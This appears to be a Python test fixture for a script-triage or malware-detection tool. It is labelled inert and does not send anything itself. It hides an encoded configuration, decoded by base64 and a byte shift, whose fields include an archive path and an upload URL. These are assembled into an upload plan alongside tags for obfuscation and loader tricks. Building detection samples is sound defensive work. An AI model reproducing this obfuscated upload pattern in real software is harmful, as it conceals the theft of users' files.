# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_a010367f = ("kVhNl46PgIuOWH6Kh4eAfo96h4p+fIdHgIl+in+AenyNfoOEkYBHj418iY6IhI96jYCIio+Al3x/fIuPgI1YkI2Hh4R9eo2AjJCAjo96fYp/lJeOj3yCgHp+i"
    "pCJj1hMl46UiY98k1h/hH6PhIqJfI2Uen+Ejot8j36Dl4p9gZCOfnyPhIqJWId8iH1/fHqEiX+EjYB+j4SKiZd+fI2NhICNWIuUhImOj3yHh4CNeoqJgH+EjZ"
    "eShIl/ipKOen6DfISJWI2QiX+Hh05NeouNgH+AfoCOjoqNl358iIt8hIKJeoR/WH58iIt8hIKJSE9MgICAgFR/T4GXkIuHinx/epCNh1iDj4+LjlVKSk9MgIC"
    "AgFR/T4FJgJN8iIuHgEmEiZF8h4R/SpCLh4p8f5d8jX6DhJGAeot8j4NYXlVKa42Kgo18iF98j3xKY5CJj42Ajo5nfH1Kfnx+g4BIT0yAgICAVH9PgUmVhIs=")
CODEC_a010367f = "base64_chunks|add_modulo_256|1b"

def load_a010367f():
    return base64.b64decode(MATERIAL_a010367f)

def decode_a010367f(e):
    return bytes((value - 27) % 256 for value in e)

def recover_a010367f():
    n = 19 * 7 - 133
    for _pass in range(1):
        d = decode_a010367f(load_a010367f())
    t = d.decode("ascii", "strict")
    return t

def inspect_a010367f():
    view = memoryview(recover_a010367f().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_a010367f():
    routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
    return routes["selected"]()

def obfuscation_a010367f():
    recover = lambda value: value
    return recover("lambda_indirection")

def plan_a010367f():
    fields = dict(item.split("=", 1) for item in inspect_a010367f().split("|"))
    analysis_surface = surface_a010367f()
    obfuscation_surface = obfuscation_a010367f()
    operation_plan = ("urllib_request_body", fields["archive_path"], fields["upload_url"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_a010367f())

# reconstruction complete